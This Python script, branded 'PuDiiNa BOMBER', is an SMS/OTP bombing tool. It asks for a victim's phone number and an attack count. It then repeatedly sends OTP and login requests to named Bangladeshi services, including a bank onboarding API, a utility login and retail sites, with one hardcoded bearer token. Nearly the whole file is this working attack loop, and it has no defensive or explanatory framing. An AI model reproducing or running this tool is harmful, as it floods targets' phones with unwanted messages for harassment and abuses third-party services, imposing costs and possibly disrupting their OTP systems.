import requests
from requests.structures import CaseInsensitiveDict


import requests, os, time, sys, smtplib

blue = '\x1b[94m'
lightblue = '\x1b[94m'
red = '\x1b[91m'
white = '\x1b[97m'
green = '\x1b[93m'
green = '\x1b[1;32m'
cyan = '\x1b[96m'
end = '\x1b[0m'
yellow = '\n\n\x1b[1;93m'
os.system('clear')
logo='''
 	    \x1b[1;93m
────────────────
─██████████████─
─██▒▒▒▒▒▒▒▒▒▒██─
─██▒▒██████▒▒██─
─██▒▒██──██▒▒██─
─██▒▒██████▒▒██─
─██▒▒▒▒▒▒▒▒▒▒██─
─██▒▒██████████─
─██▒▒██─────────
─██▒▒██─────────
─██▒▒██─────────
─██████─────────
────────────────
 	    \x1b[91m
────────────────
─██████──██████─
─██▒▒██──██▒▒██─
─██▒▒██──██▒▒██─
─██▒▒██──██▒▒██─
─██▒▒██──██▒▒██─
─██▒▒██──██▒▒██─
─██▒▒██──██▒▒██─
─██▒▒██──██▒▒██─
─██▒▒██████▒▒██─
─██▒▒▒▒▒▒▒▒▒▒██─
─██████████████─
────────────────
 	    \x1b[1;32m
────────────────
─████████████───
─██▒▒▒▒▒▒▒▒████─
─██▒▒████▒▒▒▒██─
─██▒▒██──██▒▒██─
─██▒▒██──██▒▒██─
─██▒▒██──██▒▒██─
─██▒▒██──██▒▒██─
─██▒▒██──██▒▒██─
─██▒▒████▒▒▒▒██─
─██▒▒▒▒▒▒▒▒████─
─████████████───
────────────────
 	    \x1b[1;93m
────────────
─██████████─
─██▒▒▒▒▒▒██─
─████▒▒████─
───██▒▒██───
───██▒▒██───
───██▒▒██───
───██▒▒██───
───██▒▒██───
─████▒▒████─
─██▒▒▒▒▒▒██─
─██████████─
────────────
 	    \x1b[91m
────────────────────────
─██████──────────██████─
─██▒▒██████████──██▒▒██─
─██▒▒▒▒▒▒▒▒▒▒██──██▒▒██─
─██▒▒██████▒▒██──██▒▒██─
─██▒▒██──██▒▒██──██▒▒██─
─██▒▒██──██▒▒██──██▒▒██─
─██▒▒██──██▒▒██──██▒▒██─
─██▒▒██──██▒▒██████▒▒██─
─██▒▒██──██▒▒▒▒▒▒▒▒▒▒██─
─██▒▒██──██████████▒▒██─
─██████──────────██████─
────────────────────────
 	    \x1b[1;32m
────────────────
─██████████████─
─██▒▒▒▒▒▒▒▒▒▒██─
─██▒▒██████▒▒██─
─██▒▒██──██▒▒██─
─██▒▒██████▒▒██─
─██▒▒▒▒▒▒▒▒▒▒██─
─██▒▒██████▒▒██─
─██▒▒██──██▒▒██─
─██▒▒██──██▒▒██─
─██▒▒██──██▒▒██─
─██████──██████─
────────────────
 	    
 	    '''+end
logo_2='''\x1b[93m         --------------------------------------\n\x1b[96m		     **PuDiiNa BOMBER**  \n\x1b[1;32m	          Author  :     PuDiiNa \n\x1b[91m             	  Facebook: 	Md Wahiid \n\x1b[1;32m	          Github  :     PuDiNa3030 \n\x1b[1;93m         --------------------------------------
'''
def logoprint(PuDiNa):
    for word in PuDiNa + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(0.03)
        
os.system('clear')
print(logo)
logoprint(logo_2)

print ("	 -!-!- WeLcOmE-!-!- (JuSt HeLp GrOuP ) ")

print ("	 -!-!- WeLcOmE-!-!- ( JuSt-HeLp GrOuP ) ( @##JuSt HeLp GrOuP##@ ) ")




number  = str(input("[>] HeY Mr : PuDiNa Sir. apNar aTTack NumBer DiN: "))


amount = int(input("[>] PuDiNA Sir apNar aTTack ar PoriMaN LikHuN: "))

url1 = "http://nesco.sslwireless.com:80/api/v1/login"

headers1 = CaseInsensitiveDict()
headers1["Content-Type"] = "application/x-www-form-urlencoded"

data1 = "phone_number="+number

url2 = "http://nesco.sslwireless.com:80/api/v1/login"

headers2 = CaseInsensitiveDict()
headers2["Content-Type"] = "application/x-www-form-urlencoded"

data2 = "phone_number="+number


url3 = "http://nesco.sslwireless.com:80/api/v1/login"

headers3 = CaseInsensitiveDict()
headers3["Content-Type"] = "application/x-www-form-urlencoded"

data3 = "phone_number="+number


url4 = "http://nesco.sslwireless.com:80/api/v1/login"

headers4 = CaseInsensitiveDict()
headers4["Content-Type"] = "application/x-www-form-urlencoded"

data4 = "phone_number="+number


url5 = "http://nesco.sslwireless.com:80/api/v1/login"

headers5 = CaseInsensitiveDict()
headers5["Content-Type"] = "application/x-www-form-urlencoded"

data5 = "phone_number="+number

url6 = "http://nesco.sslwireless.com:80/api/v1/login"

headers6 = CaseInsensitiveDict()
headers6["Content-Type"] = "application/x-www-form-urlencoded"

data6 = "phone_number="+number

url7 = "http://nesco.sslwireless.com:80/api/v1/login"

headers7 = CaseInsensitiveDict()
headers7["Content-Type"] = "application/x-www-form-urlencoded"

data7 = "phone_number="+number

url8 = "http://nesco.sslwireless.com:80/api/v1/login"

headers8 = CaseInsensitiveDict()
headers8["Content-Type"] = "application/x-www-form-urlencoded"

data8 = "phone_number="+number

url9 = "http://27.131.15.19/lstyle/api/lsotprequest"

headers9 = CaseInsensitiveDict()

headers9["Content-Length"]="48"

headers9["Content-Type"]="application/json;charset=utf-8"

data9 = """{
  \"shortcode\": \"2494905\",
  \"msisdn\": \"88"""+number+"""\"
}"""
url10 = "http://27.131.15.19/lstyle/api/lsotprequest"

headers10 = CaseInsensitiveDict()

headers10["Content-Length"]="48"

headers10["Content-Type"]="application/json;charset=utf-8"

data10 = """{
  \"shortcode\": \"2494905\",
  \"msisdn\": \"88"""+number+"""\"
}"""


url11 = "http://27.131.15.19/lstyle/api/lsotprequest"

headers11 = CaseInsensitiveDict()

headers11["Content-Length"]="48"

headers11["Content-Type"]="application/json;charset=utf-8"

data11 = """{
  \"shortcode\": \"2494905\",
  \"msisdn\": \"88"""+number+"""\"
}"""



url12 = "http://27.131.15.19/lstyle/api/lsotprequest"

headers12 = CaseInsensitiveDict()

headers12["Content-Length"]="48"

headers12["Content-Type"]="application/json;charset=utf-8"

data12 = """{
  \"shortcode\": \"2494905\",
  \"msisdn\": \"88"""+number+"""\"
}"""

url13 = "http://27.131.15.19/lstyle/api/lsotprequest"

headers13 = CaseInsensitiveDict()

headers13["Content-Length"]="48"

headers13["Content-Type"]="application/json;charset=utf-8"

data13 = """{
  \"shortcode\": \"2494905\",
  \"msisdn\": \"88"""+number+"""\"
}"""

url14 = "http://27.131.15.19/lstyle/api/lsotprequest"

headers14 = CaseInsensitiveDict()

headers14["Content-Length"]="48"

headers14["Content-Type"]="application/json;charset=utf-8"

data14 = """{
  \"shortcode\": \"2494905\",
  \"msisdn\": \"88"""+number+"""\"
}"""

url15 = "http://27.131.15.19/lstyle/api/lsotprequest"

headers15 = CaseInsensitiveDict()

headers15["Content-Length"]="48"

headers15["Content-Type"]="application/json;charset=utf-8"

data15 = """{
  \"shortcode\": \"2494905\",
  \"msisdn\": \"88"""+number+"""\"
}"""




url16 = "http://27.131.15.19/lstyle/api/lsotprequest"

headers16 = CaseInsensitiveDict()

headers16["Content-Length"]="48"

headers16["Content-Type"]="application/json;charset=utf-8"

data16 = """{
  \"shortcode\": \"2494905\",
  \"msisdn\": \"88"""+number+"""\"
}"""







url17 = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"

headers17 = CaseInsensitiveDict()

headers17["Content-Type"]="application/json; charset=UTF-8"

data17 = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+number+'","otpSms":"","product_id":"250","requestChannel":"MOB","trackingStatus":5}'

url18 = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"

headers18 = CaseInsensitiveDict()

headers18["Content-Type"]="application/json; charset=UTF-8"

data18 = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+number+'","otpSms":"","product_id":"250","requestChannel":"MOB","trackingStatus":5}'

url19 = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"

headers19 = CaseInsensitiveDict()

headers19["Content-Type"]="application/json; charset=UTF-8"

data19 = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+number+'","otpSms":"","product_id":"250","requestChannel":"MOB","trackingStatus":5}'

url20 = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"

headers20 = CaseInsensitiveDict()

headers20["Content-Type"]="application/json; charset=UTF-8"

data20 = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+number+'","otpSms":"","product_id":"250","requestChannel":"MOB","trackingStatus":5}'

url21 = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"

headers21 = CaseInsensitiveDict()

headers21["Content-Type"]="application/json; charset=UTF-8"

data21 = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+number+'","otpSms":"","product_id":"250","requestChannel":"MOB","trackingStatus":5}'

url22 = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"

headers22 = CaseInsensitiveDict()

headers22["Content-Type"]="application/json; charset=UTF-8"

data22 = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+number+'","otpSms":"","product_id":"250","requestChannel":"MOB","trackingStatus":5}'

url23 = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"

headers23 = CaseInsensitiveDict()

headers23["Content-Type"]="application/json; charset=UTF-8"

data23 = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+number+'","otpSms":"","product_id":"250","requestChannel":"MOB","trackingStatus":5}'

url24 = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"

headers24 = CaseInsensitiveDict()

headers24["Content-Type"]="application/json; charset=UTF-8"

data24 = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+number+'","otpSms":"","product_id":"250","requestChannel":"MOB","trackingStatus":5}'

url25 = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"

headers25 = CaseInsensitiveDict()

headers25["Content-Type"]="application/json; charset=UTF-8"

data25 = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+number+'","otpSms":"","product_id":"250","requestChannel":"MOB","trackingStatus":5}'

url26 = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"

headers26 = CaseInsensitiveDict()

headers26["Content-Type"]="application/json; charset=UTF-8"

data26 = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+number+'","otpSms":"","product_id":"250","requestChannel":"MOB","trackingStatus":5}'



url27 = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"

headers27 = CaseInsensitiveDict()

headers27["Content-Type"]="application/json; charset=UTF-8"

data27 = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+number+'","otpSms":"","product_id":"250","requestChannel":"MOB","trackingStatus":5}'






url28 = "http://nesco.sslwireless.com:80/api/v1/login"

headers28 = CaseInsensitiveDict()
headers28["Content-Type"] = "application/x-www-form-urlencoded"

data28 = "phone_number="+number




url29 = "http://nesco.sslwireless.com:80/api/v1/login"

headers29 = CaseInsensitiveDict()
headers29["Content-Type"] = "application/x-www-form-urlencoded"

data29 = "phone_number="+number


url30 = "http://nesco.sslwireless.com:80/api/v1/login"

headers30 = CaseInsensitiveDict()
headers30["Content-Type"] = "application/x-www-form-urlencoded"

data30 = "phone_number="+number



url31 = "http://nesco.sslwireless.com:80/api/v1/login"

headers31 = CaseInsensitiveDict()
headers31["Content-Type"] = "application/x-www-form-urlencoded"

data31 = "phone_number="+number





url32 = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"

headers32 = CaseInsensitiveDict()

headers32["Content-Type"]="application/json; charset=UTF-8"

data32 = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+number+'","otpSms":"","product_id":"250","requestChannel":"MOB","trackingStatus":5}'










url33 = "http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-"+number+"/operator-Robi/send"

url34 = "http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-"+number+"/operator-Robi/send"

url35 = "http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-"+number+"/operator-Robi/send"

url36 = "http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-"+number+"/operator-Robi/send"


url37 = "http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-"+number+"/operator-Robi/send"


url38 = "http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-"+number+"/operator-Robi/send"

url39 = "http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-"+number+"/operator-Robi/send"

url40 = "http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-"+number+"/operator-Robi/send"

url41 = "https://shopup.com.bd/users/send_user_otp.json"

headers41 = CaseInsensitiveDict()
headers41["Content-Type"] = "application/json"

data41 = '{"user":{"login":"88'+number+'","resend":false,"type":{"register":true}},"direct_login":true}'

url42 = "https://shopup.com.bd/users/send_user_otp.json"

headers42 = CaseInsensitiveDict()
headers2["Content-Type"] = "application/json"

data42 = '{"user":{"login":"88'+number+'","resend":false,"type":{"register":true}},"direct_login":true}'



url43 = "https://shopup.com.bd/users/send_user_otp.json"

headers43 = CaseInsensitiveDict()
headers43["Content-Type"] = "application/json"

data43 = '{"user":{"login":"88'+number+'","resend":false,"type":{"register":true}},"direct_login":true}'


url44 = "https://shopup.com.bd/users/send_user_otp.json"

headers44 = CaseInsensitiveDict()
headers44["Content-Type"] = "application/json"

data44 = '{"user":{"login":"88'+number+'","resend":false,"type":{"register":true}},"direct_login":true}'

url45 = "https://shopup.com.bd/users/send_user_otp.json"

headers45 = CaseInsensitiveDict()
headers45["Content-Type"] = "application/json"

data45 = '{"user":{"login":"88'+number+'","resend":false,"type":{"register":true}},"direct_login":true}'

url46 = "https://shopup.com.bd/users/send_user_otp.json"

headers46 = CaseInsensitiveDict()
headers46["Content-Type"] = "application/json"

data46 = '{"user":{"login":"88'+number+'","resend":false,"type":{"register":true}},"direct_login":true}'

url47 = "https://shopup.com.bd/users/send_user_otp.json"

headers47 = CaseInsensitiveDict()
headers47["Content-Type"] = "application/json"

data47 = '{"user":{"login":"88'+number+'","resend":false,"type":{"register":true}},"direct_login":true}'

url48 = "https://shopup.com.bd/users/send_user_otp.json"

headers48 = CaseInsensitiveDict()
headers48["Content-Type"] = "application/json"

data48 = '{"user":{"login":"88'+number+'","resend":false,"type":{"register":true}},"direct_login":true}'


url49 = "http://api.myguardianbd.com:80/api/requestOtp"

headers49 = CaseInsensitiveDict()
headers49["Content-Type"] = "application/x-www-form-urlencoded"

headers49["Authorization"] = "Bearer 7dd7c79eaa1ac79a1f65ce1234aae70b34434cbab673a4bd19563b83192h76a5621ce7b3c3c8662c51df329b203cb0c987b2"

data49 = "new=1&device_id=40d4801634a656ee&mobile="+number


url50 = "http://api.myguardianbd.com:80/api/requestOtp"

headers50 = CaseInsensitiveDict()
headers50["Content-Type"] = "application/x-www-form-urlencoded"

headers50["Authorization"] = "Bearer 7dd7c79eaa1ac79a1f65ce1234aae70b34434cbab673a4bd19563b83192h76a5621ce7b3c3c8662c51df329b203cb0c987b2"

data50 = "new=1&device_id=40d4801634a656ee&mobile="+number


url51 = "http://api.myguardianbd.com:80/api/requestOtp"

headers51 = CaseInsensitiveDict()
headers51["Content-Type"] = "application/x-www-form-urlencoded"

headers51["Authorization"] = "Bearer 7dd7c79eaa1ac79a1f65ce1234aae70b34434cbab673a4bd19563b83192h76a5621ce7b3c3c8662c51df329b203cb0c987b2"

data51 = "new=1&device_id=40d4801634a656ee&mobile="+number

url52 = "http://api.myguardianbd.com:80/api/requestOtp"

headers52 = CaseInsensitiveDict()
headers52["Content-Type"] = "application/x-www-form-urlencoded"

headers52["Authorization"] = "Bearer 7dd7c79eaa1ac79a1f65ce1234aae70b34434cbab673a4bd19563b83192h76a5621ce7b3c3c8662c51df329b203cb0c987b2"

data52 = "new=1&device_id=40d4801634a656ee&mobile="+number


url53 = "http://api.myguardianbd.com:80/api/requestOtp"

headers53 = CaseInsensitiveDict()
headers53["Content-Type"] = "application/x-www-form-urlencoded"

headers53["Authorization"] = "Bearer 7dd7c79eaa1ac79a1f65ce1234aae70b34434cbab673a4bd19563b83192h76a5621ce7b3c3c8662c51df329b203cb0c987b2"

data53 = "new=1&device_id=40d4801634a656ee&mobile="+number


url54 = "http://api.myguardianbd.com:80/api/requestOtp"

headers54 = CaseInsensitiveDict()
headers54["Content-Type"] = "application/x-www-form-urlencoded"

headers54["Authorization"] = "Bearer 7dd7c79eaa1ac79a1f65ce1234aae70b34434cbab673a4bd19563b83192h76a5621ce7b3c3c8662c51df329b203cb0c987b2"

data54 = "new=1&device_id=40d4801634a656ee&mobile="+number


url55 = "http://api.myguardianbd.com:80/api/requestOtp"

headers55 = CaseInsensitiveDict()
headers55["Content-Type"] = "application/x-www-form-urlencoded"

headers55["Authorization"] = "Bearer 7dd7c79eaa1ac79a1f65ce1234aae70b34434cbab673a4bd19563b83192h76a5621ce7b3c3c8662c51df329b203cb0c987b2"

data55 = "new=1&device_id=40d4801634a656ee&mobile="+number


url56 = "http://api.myguardianbd.com:80/api/requestOtp"

headers56 = CaseInsensitiveDict()
headers56["Content-Type"] = "application/x-www-form-urlencoded"

headers56["Authorization"] = "Bearer 7dd7c79eaa1ac79a1f65ce1234aae70b34434cbab673a4bd19563b83192h76a5621ce7b3c3c8662c51df329b203cb0c987b2"

data56 = "new=1&device_id=40d4801634a656ee&mobile="+number


url57 = "http://api.myguardianbd.com:80/api/requestOtp"

headers57 = CaseInsensitiveDict()
headers57["Content-Type"] = "application/x-www-form-urlencoded"

headers57["Authorization"] = "Bearer 7dd7c79eaa1ac79a1f65ce1234aae70b34434cbab673a4bd19563b83192h76a5621ce7b3c3c8662c51df329b203cb0c987b2"

data57 = "new=1&device_id=40d4801634a656ee&mobile="+number


url58 = "http://api.myguardianbd.com:80/api/requestOtp"

headers58 = CaseInsensitiveDict()
headers58["Content-Type"] = "application/x-www-form-urlencoded"

headers58["Authorization"] = "Bearer 7dd7c79eaa1ac79a1f65ce1234aae70b34434cbab673a4bd19563b83192h76a5621ce7b3c3c8662c51df329b203cb0c987b2"

data58 = "new=1&device_id=40d4801634a656ee&mobile="+number


















	

for i in range(amount):
	try:
		resp1 = requests.post(url1, headers=headers1, data=data1)

		
		resp2 = requests.post(url2, headers=headers2, data=data2)				
								
	
		
		resp3 = requests.post(url3, headers=headers3, data=data3)
		
		resp4 = requests.post(url4, headers=headers4, data=data4)

		resp5 = requests.post(url5, headers=headers5, data=data5)
		
		resp6 = requests.post(url6, headers=headers5, data=data6)
		
		resp7 = requests.post(url7, headers=headers7, data=data7)
		
		resp8 = requests.post(url8, headers=headers8, data=data8)
		
		resp9 = requests.post(url9, headers=headers9, data=data9)
		
		resp10 = requests.post(url10, headers=headers10, data=data10)
		
		resp11 = requests.post(url11, headers=headers11, data=data11)
		
		resp12 = requests.post(url12, headers=headers12, data=data12)
		
		resp13 = requests.post(url13, headers=headers13, data=data13)
		
		resp14 = requests.post(url14, headers=headers14, data=data14)
		
		resp15 = requests.post(url15, headers=headers15, data=data15)

		resp16 = requests.post(url16, headers=headers16, data=data16)

		
		resp17 = requests.post(url17, headers=headers17, data=data17)				
								
		resp18 = requests.post(url18, headers=headers18, data=data18)
		
		resp19 = requests.post(url19, headers=headers19, data=data19)

		resp20 = requests.post(url20, headers=headers20, data=data20)
		
		resp21 = requests.post(url21, headers=headers21, data=data21)
		
		resp22 = requests.post(url22, headers=headers22, data=data22)
		
		resp23 = requests.post(url23, headers=headers23, data=data23)
		
		resp24 = requests.post(url24, headers=headers24, data=data24)
		
		resp25 = requests.post(url25, headers=headers25, data=data25)
		
		resp26 = requests.post(url26, headers=headers26, data=data26)
		
		resp27 = requests.post(url27, headers=headers27, data=data27)
		
		resp28 = requests.post(url28, headers=headers28, data=data28)
		
		resp29 = requests.post(url29, headers=headers29, data=data29)
		
		resp30 = requests.post(url30, headers=headers30, data=data30)
		
		resp31 = requests.post(url31, headers=headers31, data=data31)
		
		resp32 = requests.post(url32, headers=headers32, data=data32)
		
		

		resp33 = requests.get(url33)
		
		resp34 = requests.get(url34)
		
		resp35 = requests.get(url35)
		
		resp36 = requests.get(url36)
		
		resp37 = requests.get(url37)
		resp38 = requests.get(url38)
		
		resp39 = requests.get(url39)
		
		resp40 = requests.get(url40)
		resp41 = requests.post(url41, headers=headers41, data=data41)
		
		resp42 = requests.post(url42, headers=headers42, data=data42)
		
		resp43 = requests.post(url43, headers=headers43, data=data43)
		
		resp44 = requests.post(url44, headers=headers44, data=data44)
		
		resp45 = requests.post(url45, headers=headers45, data = data45)
		
		resp46 = requests.post(url46, headers=headers46, data = data46)
		
		resp47 = requests.post(url47, headers=headers47, data = data47)
		
		resp48 = requests.post(url48, headers=headers48, data = data48)
		resp49 = requests.post(url49, headers=headers49, data=data49)
		resp50 = requests.post(url50, headers=headers50, data=data50)

		resp51 = requests.post(url51, headers=headers51, data=data51)



		resp52 = requests.post(url52, headers=headers52, data=data52)



		resp53 = requests.post(url53, headers=headers53, data=data53)


		resp54 = requests.post(url54, headers=headers54, data=data54)


		resp55 = requests.post(url55, headers=headers55, data=data55)

		resp56 = requests.post(url56, headers=headers56, data=data56)




		resp57 = requests.post(url57, headers=headers57, data=data57)


		resp58 = requests.post(url58, headers=headers58, data=data58)

		print(str (i+1)+"  PuDiNa SiiR PiiN SeNT HoYeChE \n")
	except:
		print ("Please Make Sure Your Internet Connection")